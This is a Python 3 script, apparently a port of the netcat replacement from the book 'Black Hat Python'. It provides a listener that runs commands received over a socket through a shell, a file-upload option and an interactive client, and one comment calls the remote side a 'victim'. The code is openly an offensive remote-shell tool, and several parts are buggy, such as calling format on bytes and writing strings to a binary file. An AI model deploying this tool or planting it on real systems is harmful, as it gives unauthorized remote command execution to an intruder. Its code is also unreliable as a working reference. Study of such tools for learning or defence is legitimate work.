#!/usr/bin/python3
import socket
import sys
import threading
import subprocess
import argparse
import os

# define global variables
LISTEN = False
COMMAND = False
UPLOAD = False
EXECUTE = ""
TARGET = ""
UPLOAD_DEST = ""
PORT = 0


def main():
    menu = argparse.ArgumentParser("[*] NETCAT REPLACE BOOK BLACK HAT PYTHON WITH PYTHON3 [*]")
    menu.add_argument("-t", "--target", help="[+] TARGET HOST", type=str, default="0.0.0.0")
    menu.add_argument("-p", "--port", help="[+] PORT HOST")
    menu.add_argument("-l", "--listen", help="[+] LISTEN PORT", action='store_true', default=False)
    menu.add_argument("-c", "--command", help="[+] COMMAND TO EXECUTE", action='store_true', default=False)
    menu.add_argument("-e", "--execute", help="[+] EXECUTE THE GIVEN FILE")
    menu.add_argument("-u", "--upload", help="[+] UPLOAD A FILE TO A DESTINATION")
    args = menu.parse_args()
    return args



## pass keyboard commands to a vitcm
def client_sender(buffer):
    ## create a socket connection with the server
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        # connect to our server host
        print("[+] Try connect with {}:{}".format(TARGET,PORT))
        client.connect((str(TARGET),int(PORT)))
        server_ip, port = client.getsockname()
        print("[*] Connetion sucess with {}:{}".format(server_ip,port))

        if len(buffer):
            try:
                client.send(buffer.encode('utf-8'))
            except Exception as identifier:
                print(identifier)
            
            
        
        while True:
            # now wait the client for send the data back
            recv_len = 1
            response = ""
    

            while recv_len:
                data = client.recv(4096)
                # debug
                print("data back >> {}".format(data.decode('utf-8')))
                recv_len = len(data)
                response += data.decode('utf-8')

                if recv_len < 4096:
                    break

            # more command to buffer
            buffer = input(">>>  ")
            buffer += "\n"
            client.send(buffer.encode('utf-8'))

    except Exception as e:
        print("[-] Connection to the client ERRO  exiting connetion [-]")
        print(e)
        client.close()


def run_command(command):
    # TRIM LINES
    
    command = command.rstrip()
    print("RUN COMMAND : DEBUG: {}".format(command))
    if 'exit' in command:
        sys.exit(0)
        
    ## get the output back command 
    try:
        print("[*] Sending command {}".format(command))
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        print("[*] returning {}".format(output))
    except Exception as e:
        output = "[-] Command Failed ! [-]"
        print(e)
    
    ## send output back
    return output



def client_handler(client_socket):

    global UPLOAD_DEST
    global EXECUTE
    global COMMAND

    server_ip, port = client_socket.getsockname()
    print("[+] STATUS: {}:{}".format(server_ip,port))
    print(EXECUTE)

    #check for upload
    if len(UPLOAD_DEST):
        # read all of bytes of target and write to our path
        file_buffer = ""

        # keep reading data until none is avaliable
        while True:
            data = client_socket.recv(1024)
            if not data.decode('utf-8'):
                break
            else:
                file_buffer += data.decode('utf-8')
        
        #take the bytes and get them out
        try:
            file_descriptor = open(UPLOAD_DEST, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client_socket.send("[+] Sucess save file to {}".encode("utf-8").format(UPLOAD_DEST))
        except Exception as e:
            client_socket.send("[-] ERROR SENT FILE FROM {}".encode("utf-8").format(client_socket.getsockname()))
            print(e)
        
    # check for command
    if EXECUTE:
        # run the command
        print("[*] Exec command")
        output = run_command(EXECUTE)
        client_socket.send(output)
        
        
        
    # now command shell was requested loop
    if COMMAND:
        while True:
            # show simple prompt
            client_socket.send("$SHELL: ".encode('utf-8'))
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                client_response = client_socket.recv(1024)
                cmd_buffer = cmd_buffer + client_response.decode('utf-8')
                ## send back the command output
                response = run_command(cmd_buffer)
                ## send back response
                print("DEBUG: {}".format(response))
                client_socket.send(response)



def server_loop():

    global TARGET
    global PORT

    PORT = int(PORT)
    TARGET = str(TARGET)

    if TARGET == "":
        TARGET = "0.0.0.0"
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((TARGET,PORT))
    server.listen(5)


    while True:

        client_socket, addr = server.accept()
        print("[+] Connected with {}".format(addr))
        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()


if __name__ == '__main__':

    args = main()
    PORT = args.port 
    UPLOAD = args.upload 
    EXECUTE = args.execute
    TARGET = args.target
    COMMAND = args.command
    LISTEN = args.listen

    if not len(sys.argv[1:]):
        print("[*] HELP WITH python3 {} -h".format(sys.argv[0]))
    
    if not args.listen and len(str(TARGET)) and int(PORT) > 0:
        ## read keyboard input until CTRL + D press
        print("[-] Type Something and after press CTRL + D to send data to the server [-]")
        buffer = sys.stdin.read()
        client_sender(buffer)
    
    if args.listen:
        server_loop()
        
